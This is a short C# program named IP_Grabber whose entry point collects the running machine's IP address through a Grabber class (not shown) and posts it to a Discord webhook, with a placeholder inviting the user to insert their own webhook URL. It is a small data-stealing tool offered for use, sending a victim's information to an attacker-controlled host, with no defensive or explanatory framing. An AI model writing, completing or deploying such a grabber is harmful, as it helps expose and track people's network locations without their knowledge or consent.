using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net;
using System.Collections.Specialized;

namespace IP_Grabber
{
    class Program
    {
        static void Main(string[] args)
        {
            string webhook = "/*Add your discord webhook here!*/";
            var wbc = new WebClient();
            var data = new NameValueCollection();
            data["content"] = Grabber.GetIp();
            wbc.UploadValues(webhook, data);
        }
    }
}
